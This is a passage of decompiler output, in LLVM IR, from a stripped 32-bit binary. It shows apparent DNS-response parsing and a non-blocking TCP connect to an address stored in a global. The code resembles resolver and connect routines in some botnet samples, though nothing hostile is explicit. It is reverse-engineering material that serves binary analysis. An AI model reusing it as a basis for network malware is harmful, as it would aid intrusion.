  br i1 %v8_805002f, label %dec_label_pc_80500d4, label %dec_label_pc_805003d

dec_label_pc_805003d:                             ; preds = %dec_label_pc_80500d4, %dec_label_pc_805002a
  store i32 %v1_8050034, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_805004620 = inttoptr i32 %v1_8050034 to i8*
  %v2_805004621 = load i8, i8* %v1_805004620, align 1
  %v3_805004622 = zext i8 %v2_805004621 to i32
  %v5_805004624 = and i32 %v4_805004623, -256
  %v6_805004625 = or i32 %v3_805004622, %v5_805004624
  store i32 %v6_805004625, i32* %eax.global-to-local, align 4
  %v4_805004826 = icmp eq i8 %v2_805004621, 0
  br i1 %v4_805004826, label %dec_label_pc_8050079, label %dec_label_pc_805004c.preheader.preheader

dec_label_pc_805004c.preheader.preheader:         ; preds = %dec_label_pc_805003d
  %v1_805006d = add i32 %v0_804ffe2127, 32
  br label %dec_label_pc_805004c.preheader

dec_label_pc_805004c.preheader:                   ; preds = %dec_label_pc_805004c.preheader.preheader, %dec_label_pc_80500c8
  %v0_80500cc = phi i32 [ %v3_80500cc, %dec_label_pc_80500c8 ], [ 1, %dec_label_pc_805004c.preheader.preheader ]
  %v0_80500c962 = phi i32 [ %v0_80500c9, %dec_label_pc_80500c8 ], [ 0, %dec_label_pc_805004c.preheader.preheader ]
  %v0_805005558 = phi i32 [ %v1_80500c8, %dec_label_pc_80500c8 ], [ %v1_8050034, %dec_label_pc_805004c.preheader.preheader ]
  %v0_805004c56 = phi i32 [ %v6_8050046, %dec_label_pc_80500c8 ], [ %v6_805004625, %dec_label_pc_805004c.preheader.preheader ]
  br label %dec_label_pc_805004c

dec_label_pc_805004c:                             ; preds = %dec_label_pc_805004c.preheader, %dec_label_pc_8050050
  %v0_80500c9 = phi i32 [ %v0_80500c962, %dec_label_pc_805004c.preheader ], [ 1, %dec_label_pc_8050050 ]
  %v0_80500c8 = phi i32 [ %v0_805005558, %dec_label_pc_805004c.preheader ], [ %v2_8050071, %dec_label_pc_8050050 ]
  %v4_8050046 = phi i32 [ %v0_805004c56, %dec_label_pc_805004c.preheader ], [ %v6_8050073, %dec_label_pc_8050050 ]
  %v1_805004c = trunc i32 %v4_8050046 to i8
  %tmp140 = icmp ult i8 %v1_805004c, -64
  br i1 %tmp140, label %dec_label_pc_80500c8, label %dec_label_pc_8050050

dec_label_pc_8050050:                             ; preds = %dec_label_pc_805004c
  %v1_8050050 = urem i32 %v4_8050046, 256
  store i32 %v1_8050050, i32* %eax.global-to-local, align 4
  %v1_8050055 = add i32 %v0_80500c8, 1
  %v2_8050055 = inttoptr i32 %v1_8050055 to i8*
  %v3_8050055 = load i8, i8* %v2_8050055, align 1
  %v4_8050055 = zext i8 %v3_8050055 to i32
  store i32 1, i32* %ecx.global-to-local, align 4
  %v2_8050063 = mul nuw nsw i32 %v1_8050050, 256
  %v2_8050066 = add nsw i32 %v2_8050063, -49152
  %v3_8050066 = or i32 %v4_8050055, %v2_8050066
  store i32 %v3_8050066, i32* %eax.global-to-local, align 4
  %v2_8050071 = add i32 %v1_805006d, %v3_8050066
  store i32 %v2_8050071, i32* %edx.global-to-local, align 4
  %v1_8050073 = inttoptr i32 %v2_8050071 to i8*
  %v2_8050073 = load i8, i8* %v1_8050073, align 1
  %v3_8050073 = zext i8 %v2_8050073 to i32
  %v6_8050073 = or i32 %v3_8050073, %v2_8050066
  store i32 %v6_8050073, i32* %eax.global-to-local, align 4
  %v4_8050075 = icmp eq i8 %v2_8050073, 0
  %v1_8050077 = icmp eq i1 %v4_8050075, false
  br i1 %v1_8050077, label %dec_label_pc_805004c, label %dec_label_pc_8050079

dec_label_pc_8050079:                             ; preds = %dec_label_pc_80500c8, %dec_label_pc_8050050, %dec_label_pc_805003d
  %v1_8050079 = phi i32 [ 0, %dec_label_pc_805003d ], [ 1, %dec_label_pc_8050050 ], [ %v0_80500c9, %dec_label_pc_80500c8 ]
  %v0_8050079 = phi i32 [ 1, %dec_label_pc_805003d ], [ %v0_80500cc, %dec_label_pc_8050050 ], [ %v3_80500cc, %dec_label_pc_80500c8 ]
  %v2_8050079 = add i32 %v0_8050079, %v1_8050079
  store i32 %v2_8050079, i32* @ebx, align 4
  %v2_805007b = add i32 %v2_8050079, %v1_8050034
  br label %dec_label_pc_804ffdd.backedge

dec_label_pc_804ffdd.backedge:                    ; preds = %dec_label_pc_8050079, %dec_label_pc_80500f0
  %v0_804ffdd = phi i32 [ %v0_804ffe2127, %dec_label_pc_8050079 ], [ %v0_804ffdd.pre, %dec_label_pc_80500f0 ]
  %storemerge = phi i32 [ %v2_805007b, %dec_label_pc_8050079 ], [ %v2_80500fb, %dec_label_pc_80500f0 ]
  store i32 %storemerge, i32* %ecx.global-to-local, align 4
  %v1_804ffdd = add i32 %v0_804ffdd, 22
  %v2_804ffdd = inttoptr i32 %v1_804ffdd to i16*
  %v3_804ffdd = load i16, i16* %v2_804ffdd, align 2
  %v4_804ffdd = add i16 %v3_804ffdd, -1
  store i16 %v4_804ffdd, i16* %v2_804ffdd, align 2
  %v0_804ffe2 = load i32, i32* @esp, align 4
  %v1_804ffe2 = add i32 %v0_804ffe2, 22
  %v2_804ffe2 = inttoptr i32 %v1_804ffe2 to i16*
  %v3_804ffe2 = load i16, i16* %v2_804ffe2, align 2
  %v13_804ffe2 = icmp eq i16 %v3_804ffe2, -1
  br i1 %v13_804ffe2, label %dec_label_pc_804ff74, label %dec_label_pc_804ffea

dec_label_pc_8050083:                             ; preds = %dec_label_pc_804ff74
  %v1_8050083 = add i32 %v2_804ff80, 4
  %v2_8050083 = inttoptr i32 %v1_8050083 to i32*
  %v3_8050083 = load i32, i32* %v2_8050083, align 4
  store i32 %v3_8050083, i32* %eax.global-to-local, align 4
  %v1_8050086 = icmp eq i32 %v3_8050083, 0
  br i1 %v1_8050086, label %dec_label_pc_8050096, label %dec_label_pc_805008a

dec_label_pc_805008a:                             ; preds = %dec_label_pc_8050083
  %v3_805008d = inttoptr i32 %v0_804ff7d to i32*
  store i32 %v3_8050083, i32* %v3_805008d, align 4
  %v1_805008e = call i32 @function_80542d9(i32 1)
  store i32 %v1_805008e, i32* %eax.global-to-local, align 4
  %v0_8050093 = load i32, i32* @esp, align 4
  %v1_8050093 = add i32 %v0_8050093, 16
  br label %dec_label_pc_8050096

dec_label_pc_8050096:                             ; preds = %dec_label_pc_8050083, %dec_label_pc_805008a
  %v0_8050096 = phi i32 [ %v1_804ff7d, %dec_label_pc_8050083 ], [ %v1_8050093, %dec_label_pc_805008a ]
  %v2_8050099 = inttoptr i32 %v0_8050096 to i32*
  %v3_8050099 = load i32, i32* %v2_8050099, align 4
  store i32 %v3_8050099, i32* @esi, align 4
  %v2_805009d = add i32 %v0_8050096, -16
  %v3_805009d = inttoptr i32 %v2_805009d to i32*
  store i32 %v3_8050099, i32* %v3_805009d, align 4
  %v1_805009e = call i32 @function_80542d9(i32 1)
  store i32 %v1_805009e, i32* %eax.global-to-local, align 4
  %v0_80500a3 = load i32, i32* @esp, align 4
  %v1_80500a3 = add i32 %v0_80500a3, 16
  %v2_80500a3 = inttoptr i32 %v1_80500a3 to i32*
  store i32 0, i32* %v2_80500a3, align 4
  %v0_80500ab = load i32, i32* @esp, align 4
  %v1_80500ab = add i32 %v0_80500ab, 16
  %v1_80500ae = inttoptr i32 %v1_80500ab to i32*
  %v2_80500ae = load i32, i32* %v1_80500ae, align 4
  store i32 %v2_80500ae, i32* %eax.global-to-local, align 4
  %v1_80500b1 = add i32 %v0_80500ab, 4300
  %v1_80500b7 = inttoptr i32 %v1_80500b1 to i32*
  %v2_80500b7 = load i32, i32* %v1_80500b7, align 4
  store i32 %v2_80500b7, i32* @ebx, align 4
  %v3_80500b8 = add i32 %v0_80500ab, 4308
  %v1_80500b9 = inttoptr i32 %v3_80500b8 to i32*
  %v2_80500b9 = load i32, i32* %v1_80500b9, align 4
  store i32 %v2_80500b9, i32* @edi, align 4
  %v3_80500b9 = add i32 %v0_80500ab, 4312
  %v1_80500ba = inttoptr i32 %v3_80500b9 to i32*
  %v2_80500ba = load i32, i32* %v1_80500ba, align 4
  store i32 %v2_80500ba, i32* @ebp, align 4
  ret i32 %v2_80500ae

dec_label_pc_80500bc:                             ; preds = %dec_label_pc_804fff9
  %v1_80500bc = add i32 %v0_80500bc, 1
  store i32 %v1_80500bc, i32* %edx.global-to-local, align 4
  %v5_80500bd = icmp eq i32 %v0_80500bd, 0
  %v2_80500c0 = zext i1 %v5_80500bd to i32
  %v3_80500c0 = add i32 %v2_80500c0, %v0_80500c0
  %v1_804fff3 = inttoptr i32 %v1_80500bc to i8*
  %v2_804fff3 = load i8, i8* %v1_804fff3, align 1
  %v3_804fff3 = zext i8 %v2_804fff3 to i32
  %v5_804fff3 = and i32 %v4_804fff3, -256
  %v6_804fff3 = or i32 %v3_804fff3, %v5_804fff3
  store i32 %v6_804fff3, i32* %eax.global-to-local, align 4
  %v4_804fff5 = icmp eq i8 %v2_804fff3, 0
  br i1 %v4_804fff5, label %dec_label_pc_805002a, label %dec_label_pc_804fff9.preheader

dec_label_pc_80500c8:                             ; preds = %dec_label_pc_805004c
  %v1_80500c8 = add i32 %v0_80500c8, 1
  store i32 %v1_80500c8, i32* %edx.global-to-local, align 4
  %v5_80500c9 = icmp eq i32 %v0_80500c9, 0
  %v2_80500cc = zext i1 %v5_80500c9 to i32
  %v3_80500cc = add i32 %v2_80500cc, %v0_80500cc
  %v1_8050046 = inttoptr i32 %v1_80500c8 to i8*
  %v2_8050046 = load i8, i8* %v1_8050046, align 1
  %v3_8050046 = zext i8 %v2_8050046 to i32
  %v5_8050046 = and i32 %v4_8050046, -256
  %v6_8050046 = or i32 %v3_8050046, %v5_8050046
  store i32 %v6_8050046, i32* %eax.global-to-local, align 4
  %v4_8050048 = icmp eq i8 %v2_8050046, 0
  br i1 %v4_8050048, label %dec_label_pc_8050079, label %dec_label_pc_805004c.preheader

dec_label_pc_80500d4:                             ; preds = %dec_label_pc_805002a
  %v1_80500d4 = add i32 %v2_805002c, 2
  %v2_80500d4 = inttoptr i32 %v1_80500d4 to i16*
  %v3_80500d4 = load i16, i16* %v2_80500d4, align 2
  %v9_80500d4 = icmp eq i16 %v3_80500d4, 256
  %v1_80500da = icmp eq i1 %v9_80500d4, false
  br i1 %v1_80500da, label %dec_label_pc_805003d, label %dec_label_pc_80500e0

dec_label_pc_80500e0:                             ; preds = %dec_label_pc_80500d4
  %v1_80500e0 = add i32 %v2_805002c, 8
  %v2_80500e0 = inttoptr i32 %v1_80500e0 to i16*
  %v3_80500e0 = load i16, i16* %v2_80500e0, align 2
  %v4_80500e0 = zext i16 %v3_80500e0 to i32
  %v6_80500e0 = and i32 %v5_80500e0, -65536
  %v7_80500e0 = or i32 %v4_80500e0, %v6_80500e0
  store i32 %v7_80500e0, i32* %edx.global-to-local, align 4
  %v2_80500e6 = call i16 @llvm.bswap.i16(i16 %v3_80500e0)
  %v3_80500e6 = zext i16 %v2_80500e6 to i32
  %v6_80500e6 = or i32 %v3_80500e6, %v6_80500e0
  store i32 %v6_80500e6, i32* %eax.global-to-local, align 4
  %v10_80500ea = icmp eq i16 %v3_80500e0, 1024
  br i1 %v10_80500ea, label %dec_label_pc_8050103, label %dec_label_pc_80500f0

dec_label_pc_80500f0:                             ; preds = %dec_label_pc_80500e0, %dec_label_pc_8050103
  %v0_804ffdd.pre = phi i32 [ %v0_804ffe2127, %dec_label_pc_80500e0 ], [ %v0_804ffdd.pre.pre, %dec_label_pc_8050103 ]
  %v0_80500fb = phi i32 [ %v1_8050034, %dec_label_pc_80500e0 ], [ %v0_80500fb.pre, %dec_label_pc_8050103 ]
  %v0_80500f0 = phi i32 [ %v7_80500e0, %dec_label_pc_80500e0 ], [ %v7_8050167, %dec_label_pc_8050103 ]
  %v1_80500f0 = trunc i32 %v0_80500f0 to i16
  %v2_80500f0 = call i16 @llvm.bswap.i16(i16 %v1_80500f0)
  %v3_80500f0 = zext i16 %v2_80500f0 to i32
  %v5_80500f0 = and i32 %v0_80500f0, -65536
  %v6_80500f0 = or i32 %v3_80500f0, %v5_80500f0
  store i32 %v6_80500f0, i32* %edx.global-to-local, align 4
  store i32 %v3_80500f0, i32* %eax.global-to-local, align 4
  %v2_80500fb = add i32 %v3_80500f0, %v0_80500fb
  br label %dec_label_pc_804ffdd.backedge

dec_label_pc_8050103:                             ; preds = %dec_label_pc_80500e0
  %v2_8050103 = inttoptr i32 %v1_8050034 to i8*
  %v3_8050103 = load i8, i8* %v2_8050103, align 1
  %v4_8050103 = zext i8 %v3_8050103 to i32
  %v6_8050103 = and i32 %v6_80500e6, -256
  %v7_8050103 = or i32 %v4_8050103, %v6_8050103
  store i32 %v7_8050103, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v3_8050108 = add i32 %v0_804ffe2127, 4280
  %v4_8050108 = inttoptr i32 %v3_8050108 to i8*
  store i8 %v3_8050103, i8* %v4_8050108, align 1
  %v0_805010f = load i32, i32* @edi, align 4
  %v1_805010f = add i32 %v0_805010f, 1
  %v2_805010f = inttoptr i32 %v1_805010f to i8*
  %v3_805010f = load i8, i8* %v2_805010f, align 1
  %v4_805010f = zext i8 %v3_805010f to i32
  %v5_805010f = load i32, i32* %eax.global-to-local, align 4
  %v6_805010f = and i32 %v5_805010f, -256
  %v7_805010f = or i32 %v6_805010f, %v4_805010f
  store i32 %v7_805010f, i32* %eax.global-to-local, align 4
  %v2_8050112 = load i32, i32* @esp, align 4
  %v3_8050112 = add i32 %v2_8050112, 4281
  %v4_8050112 = inttoptr i32 %v3_8050112 to i8*
  store i8 %v3_805010f, i8* %v4_8050112, align 1
  %v0_8050119 = load i32, i32* @edi, align 4
  %v1_8050119 = add i32 %v0_8050119, 2
  %v2_8050119 = inttoptr i32 %v1_8050119 to i8*
  %v3_8050119 = load i8, i8* %v2_8050119, align 1
  %v4_8050119 = zext i8 %v3_8050119 to i32
  %v5_8050119 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050119 = and i32 %v5_8050119, -256
  %v7_8050119 = or i32 %v6_8050119, %v4_8050119
  store i32 %v7_8050119, i32* %eax.global-to-local, align 4
  %v2_805011c = load i32, i32* @esp, align 4
  %v3_805011c = add i32 %v2_805011c, 4282
  %v4_805011c = inttoptr i32 %v3_805011c to i8*
  store i8 %v3_8050119, i8* %v4_805011c, align 1
  %v0_8050123 = load i32, i32* @edi, align 4
  %v1_8050123 = add i32 %v0_8050123, 3
  %v2_8050123 = inttoptr i32 %v1_8050123 to i8*
  %v3_8050123 = load i8, i8* %v2_8050123, align 1
  %v4_8050123 = zext i8 %v3_8050123 to i32
  %v5_8050123 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050123 = and i32 %v5_8050123, -256
  %v7_8050123 = or i32 %v6_8050123, %v4_8050123
  store i32 %v7_8050123, i32* %eax.global-to-local, align 4
  %v2_8050126 = load i32, i32* @esp, align 4
  %v3_8050126 = add i32 %v2_8050126, 4283
  %v4_8050126 = inttoptr i32 %v3_8050126 to i8*
  store i8 %v3_8050123, i8* %v4_8050126, align 1
  %v0_805012d = load i32, i32* %eax.global-to-local, align 4
  %v1_805012d = load i32, i32* @esp, align 4
  %v2_805012d = add i32 %v1_805012d, -4
  %v3_805012d = inttoptr i32 %v2_805012d to i32*
  store i32 %v0_805012d, i32* %v3_805012d, align 4
  %v0_805012e = load i32, i32* %eax.global-to-local, align 4
  %v2_805012e = add i32 %v1_805012d, -8
  %v3_805012e = inttoptr i32 %v2_805012e to i32*
  store i32 %v0_805012e, i32* %v3_805012e, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8050131 = inttoptr i32 %v1_805012d to i32*
  %v3_8050131 = load i32, i32* %v2_8050131, align 4
  store i32 %v3_8050131, i32* @edx, align 4
  %v1_8050135 = inttoptr i32 %v3_8050131 to i8*
  %v2_8050135 = load i8, i8* %v1_8050135, align 1
  %v3_8050135 = zext i8 %v2_8050135 to i32
  %v1_8050137 = mul nuw nsw i32 %v3_8050135, 4
  %v2_8050137 = add nuw nsw i32 %v1_8050137, 4
  store i32 %v2_8050137, i32* %eax.global-to-local, align 4
  %v2_805013e = add i32 %v1_805012d, -12
  %v3_805013e = inttoptr i32 %v2_805013e to i32*
  store i32 %v2_8050137, i32* %v3_805013e, align 4
  %v0_805013f = load i32, i32* @edx, align 4
  %v1_805013f = add i32 %v0_805013f, 4
  %v2_805013f = inttoptr i32 %v1_805013f to i32*
  %v3_805013f = load i32, i32* %v2_805013f, align 4
  store i32 %v3_805013f, i32* %eax.global-to-local, align 4
  %v2_8050142 = add i32 %v1_805012d, -16
  %v3_8050142 = inttoptr i32 %v2_8050142 to i32*
  store i32 %v3_805013f, i32* %v3_8050142, align 4
  %v0_8050143 = call i32 @function_8053d7c()
  store i32 %v0_8050143, i32* %eax.global-to-local, align 4
  %v0_8050148 = load i32, i32* @esp, align 4
  %v1_8050148 = add i32 %v0_8050148, 16
  %v2_8050148 = inttoptr i32 %v1_8050148 to i32*
  %v3_8050148 = load i32, i32* %v2_8050148, align 4
  store i32 %v3_8050148, i32* %ecx.global-to-local, align 4
  %v1_805014c = inttoptr i32 %v3_8050148 to i8*
  %v2_805014c = load i8, i8* %v1_805014c, align 1
  %v3_805014c = zext i8 %v2_805014c to i32
  %v4_805014c = load i32, i32* @edx, align 4
  %v5_805014c = and i32 %v4_805014c, -256
  %v6_805014c = or i32 %v5_805014c, %v3_805014c
  store i32 %v6_805014c, i32* %edx.global-to-local, align 4
  %v2_805014e = add i32 %v3_8050148, 4
  %v3_805014e = inttoptr i32 %v2_805014e to i32*
  store i32 %v0_8050143, i32* %v3_805014e, align 4
  %v0_8050151 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050151 = urem i32 %v0_8050151, 256
  %v2_8050151 = load i32, i32* @ebx, align 4
  %v3_8050151 = and i32 %v2_8050151, -256
  %v4_8050151 = or i32 %v3_8050151, %v1_8050151
  store i32 %v4_8050151, i32* @ebx, align 4
  %v0_8050153 = load i32, i32* @esp, align 4
  %v1_8050153 = add i32 %v0_8050153, 4296
  %v2_8050153 = inttoptr i32 %v1_8050153 to i32*
  %v3_8050153 = load i32, i32* %v2_8050153, align 4
  store i32 %v3_8050153, i32* %ecx.global-to-local, align 4
  %v1_805015a = add i32 %v0_8050151, 1
  store i32 %v1_805015a, i32* %edx.global-to-local, align 4
  %v3_805015b = mul i32 %v4_8050151, 4
  %v4_805015b = add i32 %v3_805015b, %v0_8050143
  %v5_805015b = inttoptr i32 %v4_805015b to i32*
  store i32 %v3_8050153, i32* %v5_805015b, align 4
  %v0_805015e = load i32, i32* @esp, align 4
  %v1_805015e = add i32 %v0_805015e, 16
  %v2_805015e = inttoptr i32 %v1_805015e to i32*
  %v3_805015e = load i32, i32* %v2_805015e, align 4
  store i32 %v3_805015e, i32* %eax.global-to-local, align 4
  %v0_8050165 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050165 = trunc i32 %v0_8050165 to i8
  %v3_8050165 = inttoptr i32 %v3_805015e to i8*
  store i8 %v1_8050165, i8* %v3_8050165, align 1
  %v0_8050167 = load i32, i32* @esi, align 4
  %v1_8050167 = add i32 %v0_8050167, 8
  %v2_8050167 = inttoptr i32 %v1_8050167 to i16*
  %v3_8050167 = load i16, i16* %v2_8050167, align 2
  %v4_8050167 = zext i16 %v3_8050167 to i32
  %v5_8050167 = load i32, i32* %edx.global-to-local, align 4
  %v6_8050167 = and i32 %v5_8050167, -65536
  %v7_8050167 = or i32 %v6_8050167, %v4_8050167
  store i32 %v7_8050167, i32* %edx.global-to-local, align 4
  %v0_80500fb.pre = load i32, i32* @edi, align 4
  %v0_804ffdd.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80500f0

; uselistorder directives
  uselistorder i32 %v7_8050167, { 1, 0 }
  uselistorder i32 %v0_8050151, { 1, 0 }
  uselistorder i32 %v3_80500f0, { 0, 2, 1 }
  uselistorder i32 %v0_80500f0, { 1, 0 }
  uselistorder i32 %v6_8050046, { 1, 0 }
  uselistorder i32 %v3_80500cc, { 1, 0 }
  uselistorder i32 %v1_80500c8, { 1, 2, 0 }
  uselistorder i32 %v6_804fff3, { 2, 1, 0 }
  uselistorder i32 %v3_80500c0, { 1, 0 }
  uselistorder i32 %v1_80500bc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_8050096, { 1, 0 }
  uselistorder i32 %v0_804ffe2, { 2, 1, 0 }
  uselistorder i32 %v6_8050073, { 1, 0 }
  uselistorder i32 %v2_8050071, { 1, 2, 0 }
  uselistorder i32 %v3_8050066, { 1, 0 }
  uselistorder i32 %v4_8050046, { 1, 0, 2 }
  uselistorder i32 %v0_80500c9, { 2, 0, 1 }
  uselistorder i32 %v0_80500cc, { 1, 0 }
  uselistorder i32 %v1_8050034, { 5, 4, 1, 0, 2, 3, 6 }
  uselistorder i32 %v6_8050024, { 0, 2, 1 }
  uselistorder i32 %v2_8050022, { 0, 2, 3, 1 }
  uselistorder i32 %v3_8050017, { 1, 0 }
  uselistorder i32 %v4_804fff3, { 1, 0, 2 }
  uselistorder i32 %v0_80500bd, { 2, 0, 1 }
  uselistorder i32 %v0_80500c0, { 1, 0 }
  uselistorder i32 %v6_804fff316, { 1, 0, 2 }
  uselistorder i32 %v0_804ffea, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804ffe2127, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_804ffe2122, { 0, 2, 1 }
  uselistorder i32 %v1_804ffb3, { 1, 0 }
  uselistorder i32 %v0_804ffaf, { 0, 1, 2, 4, 5, 3 }
  uselistorder i32 %v2_804ffaa, { 1, 0, 2 }
  uselistorder i32 %v0_804ff7d, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_804ff3e, { 1, 0 }
  uselistorder i32 %v0_804feef, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 %v0_804feea, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804feb7, { 1, 0 }
  uselistorder i32 %v2_804feb4, { 1, 0 }
  uselistorder i32 %v0_804feb0, { 1, 0 }
  uselistorder i32 %v1_804fe9d, { 2, 0, 1, 3 }
  uselistorder i32 %v12_804fe91, { 1, 0 }
  uselistorder i32 %v0_804fe8e, { 2, 0, 1 }
  uselistorder i32 %v0_804fe79, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804fe57, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i32 %v0_804fe38, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v3_804fe33, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804fe18, { 1, 0 }
  uselistorder i32 %v2_804fd9f, { 1, 0 }
  uselistorder i32 %v1_804fd91, { 1, 0 }
  uselistorder i32 %v1_804fd33, { 1, 0 }
  uselistorder i8 %v2_804fd22, { 2, 0, 3, 1 }
  uselistorder i32 %v0_804fd1c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804fcf0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 27, 16, 17, 18, 19, 20, 21, 22, 60, 24, 25, 26, 58, 59, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i16 -1, { 2, 3, 0, 1 }
  uselistorder i32 4312, { 1, 0 }
  uselistorder i32 4308, { 1, 0 }
  uselistorder i32 4300, { 1, 0 }
  uselistorder i32 (i32)* @function_8054730, { 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32 (i8*)* @function_80525e0, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 24, 25, 26, 27, 21, 22, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 73, 39, 40, 67, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 68, 69, 0, 70, 71, 72 }
  uselistorder label %dec_label_pc_80500f0, { 1, 0 }
  uselistorder label %dec_label_pc_8050096, { 1, 0 }
  uselistorder label %dec_label_pc_804ffdd.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_805004c, { 1, 0 }
  uselistorder label %dec_label_pc_805004c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804fff9, { 1, 0 }
  uselistorder label %dec_label_pc_804fff9.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804ffea, { 1, 0 }
  uselistorder label %dec_label_pc_804ff74, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804fe2c, { 1, 0 }
  uselistorder label %dec_label_pc_804fd22, { 1, 0 }
}

define i32 @function_8050190() local_unnamed_addr {
dec_label_pc_8050190:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_8050190 = load i32, i32* @ebx, align 4
  %v0_8050191 = load i32, i32* @eax, align 4
  store i32 %v0_8050191, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_80501b6 = add i32 %v0_8050191, 4
  %v2_80501b6 = inttoptr i32 %v1_80501b6 to i32*
  %v3_80501b6 = load i32, i32* %v2_80501b6, align 4
  %v10_80501b9 = icmp eq i32 %v3_80501b6, -1
  br i1 %v10_80501b9, label %dec_label_pc_8050190.dec_label_pc_80501ca_crit_edge, label %dec_label_pc_80501be

dec_label_pc_8050190.dec_label_pc_80501ca_crit_edge: ; preds = %dec_label_pc_8050190
  br label %dec_label_pc_80501ca

dec_label_pc_80501be:                             ; preds = %dec_label_pc_8050190
  %v1_80501c2 = call i32 @function_8052b81(i32 %v3_80501b6)
  br label %dec_label_pc_80501ca

dec_label_pc_80501ca:                             ; preds = %dec_label_pc_8050190.dec_label_pc_80501ca_crit_edge, %dec_label_pc_80501be
  %v3_80501d1 = call i32 @function_8053375(i32 2, i32 1, i32 0)
  %v1_80501d9 = load i32, i32* @ebx, align 4
  %v2_80501d9 = add i32 %v1_80501d9, 4
  %v3_80501d9 = inttoptr i32 %v2_80501d9 to i32*
  store i32 %v3_80501d1, i32* %v3_80501d9, align 4
  %v8_80501dc = icmp eq i32 %v3_80501d1, -1
  br i1 %v8_80501dc, label %dec_label_pc_80501ca.dec_label_pc_8050253_crit_edge, label %dec_label_pc_80501df

dec_label_pc_80501ca.dec_label_pc_8050253_crit_edge: ; preds = %dec_label_pc_80501ca
  br label %dec_label_pc_8050253

dec_label_pc_80501df:                             ; preds = %dec_label_pc_80501ca
  %v0_80501e1 = load i32, i32* @ebx, align 4
  %v1_80501e1 = add i32 %v0_80501e1, 28
  store i32 %v1_80501e1, i32* @eax, align 4
  %v1_80501e9 = add i32 %v0_80501e1, 24
  %v2_80501e9 = inttoptr i32 %v1_80501e9 to i32*
  store i32 0, i32* %v2_80501e9, align 4
  %v0_80501f0 = load i32, i32* @eax, align 4
  %v2_80501f1 = call i32 @function_8052670(i32 %v0_80501f0, i32 256)
  %v0_80501f9 = load i32, i32* @ebx, align 4
  %v1_80501f9 = add i32 %v0_80501f9, 4
  %v2_80501f9 = inttoptr i32 %v1_80501f9 to i32*
  %v3_80501f9 = load i32, i32* %v2_80501f9, align 4
  %v3_8050201 = call i32 @function_8052abd(i32 %v3_80501f9, i32 3, i32 0)
  %v0_8050209 = load i32, i32* @ebx, align 4
  %v1_8050209 = add i32 %v0_8050209, 4
  %v2_8050209 = inttoptr i32 %v1_8050209 to i32*
  %v3_8050209 = load i32, i32* %v2_8050209, align 4
  %v12_805020c = or i32 %v3_8050201, 2048
  %v3_8050213 = call i32 @function_8052abd(i32 %v3_8050209, i32 4, i32 %v12_805020c)
  %v0_8050218 = load i32, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-20, align 4
  %v0_805022e = load i32, i32* @global_var_80572b0.34, align 16
  %v2_8050233 = add i32 %v0_8050218, 8
  %v3_8050233 = inttoptr i32 %v2_8050233 to i32*
  store i32 %v0_805022e, i32* %v3_8050233, align 4
  %v2_8050236 = ptrtoint i32* %stack_var_-20 to i32
  %v0_805023d = load i32, i32* @ebx, align 4
  %v1_805023d = add i32 %v0_805023d, 4
  %v2_805023d = inttoptr i32 %v1_805023d to i32*
  %v3_805023d = load i32, i32* %v2_805023d, align 4
  store i32 %v3_805023d, i32* %edx.global-to-local, align 4
  %v1_8050240 = add i32 %v0_805023d, 12
  %v2_8050240 = inttoptr i32 %v1_8050240 to i32*
  store i32 1, i32* %v2_8050240, align 4
  %v0_805024a = load i32, i32* %edx.global-to-local, align 4
  %v3_805024b = call i32 @function_805319a(i32 %v0_805024a, i32 %v2_8050236, i32 16)
  br label %dec_label_pc_8050253

dec_label_pc_8050253:                             ; preds = %dec_label_pc_80501ca.dec_label_pc_8050253_crit_edge, %dec_label_pc_80501df
  %v0_8050257 = phi i32 [ 0, %dec_label_pc_80501ca.dec_label_pc_8050253_crit_edge ], [ %v3_805024b, %dec_label_pc_80501df ]
  store i32 %v0_8050190, i32* @ebx, align 4
  ret i32 %v0_8050257

; uselistorder directives
  uselistorder i32 %v3_80501b6, { 1, 0 }
